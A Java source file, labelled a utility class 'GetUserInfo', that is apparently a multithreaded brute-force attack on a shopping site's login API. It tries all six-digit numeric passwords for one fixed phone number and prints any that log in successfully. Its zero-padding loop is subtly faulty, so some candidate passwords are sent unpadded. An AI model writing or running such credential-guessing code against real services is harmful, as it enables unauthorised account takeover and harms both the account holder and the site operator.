package com.guyue.common.util;

import java.util.HashMap;
import java.util.Map;

import org.springframework.util.StringUtils;

public class GetUserInfo {
	@SuppressWarnings("all")
	private static void getUserInfo(String password){
//		http://m.cebshop.tyiti.com/api/sysuser/login?tel=13500000000&pwd=123456
		Map<String,String> requestParams = new HashMap<String, String>();
		requestParams.put("tel", "13500000000");
		requestParams.put("pwd", password);
		String url="http://dev.m.cebshop.tyiti.com/api/sysuser/login";
		String result = HttpClientUtil.httpGet(url, new HashMap<String, String>(), requestParams);
		System.out.println(result);
	}
	public static void main(String[] args) {
		for(int i=0;i<1000000;i++){
			UserInfoThread usert = new UserInfoThread(i, i+100000);
			Thread t = new Thread(usert);
			t.start();
			i=i+100000;
		}
	}
}
class UserInfoThread implements Runnable{
	private int low;
	private int hight;
	public UserInfoThread(int low,int hight){
		this.low=low;
		this.hight=hight;
	}
	public void run() {
		String password="";
		for(;low<hight;low++){
			password=""+low;
			if(password.length()<6){
				for(int k=0;k<6-password.length();k++){
					password = "0"+password;
				}
			}
			getUserInfo(password);
		}
	}
	private static void getUserInfo(String password){
		Map<String,String> requestParams = new HashMap<String, String>();
		requestParams.put("tel", "13500000000");
		requestParams.put("pwd", password);
		String url="http://dev.m.cebshop.tyiti.com/api/sysuser/login";
		String result = HttpClientUtil.httpGet(url, new HashMap<String, String>(), requestParams);
		if((!StringUtils.isEmpty(result))&&result.indexOf("code")==-1){
			System.out.println("password="+password+"====="+result);
		}
	}
}